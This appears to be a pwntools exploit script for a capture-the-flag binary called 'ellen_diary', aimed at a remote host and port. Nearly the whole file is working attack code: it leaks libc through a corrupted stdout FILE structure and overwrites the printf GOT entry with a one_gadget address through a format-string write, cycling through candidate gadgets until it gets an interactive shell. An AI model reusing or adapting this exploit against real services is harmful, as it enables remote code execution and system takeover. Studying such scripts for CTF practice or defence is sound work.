#exploit for ellen_diary
#h4c(d0_n07_b3_ups37_3113^)
from pwn import *
import time
elf = ELF("./ellen_diary")
context.binary=elf
libc=elf.libc
context.log_level='DEBUG'
gadgets=[0x4f365,0x4f3c2,0xe58b8,0xe58bf,0xe58c3,0x10a45c,0x10a468]
for gadget in gadgets:
	try:
		target=remote('112.213.2.13',40001)
		def sla(string,val):
			target.sendlineafter(string,val)

		def sa(string,val):
			target.sendafter(string,val)

		def writeonstack(fs,data):
			sla("> ",str(1))
			sla("write on stack > ",fs)
			sa(">> ",data)

		def writeondata(data):
			sla("> ",str(2))
			sa("write on data > ",data)

		def makecopy(index):
			sla("> ",str(3))
			sla("index for copy > ",str(index))

		makecopy(-4)
		payload=p64(0xfbad1800)+"A"*24
		writeonstack("%16$s",payload+"\n\x00")
		libc_base=u64(target.recv(0x10)[8:])-0x3ed8b0
		libc_gadget=libc_base+gadget
		libc_system=libc_base+libc.symbols["system"]
		libc_malloc_hook=libc_base+libc.symbols["__malloc_hook"]
		fs="%7$s".ljust(8,"\x00")
		fs+=p64(elf.got["printf"]-0x1)
		payload=p64(libc_gadget)+"\n\x00"
		writeonstack(fs,payload)
		target.sendline(payload)
	except:
		target.close()
		continue
	target.interactive()
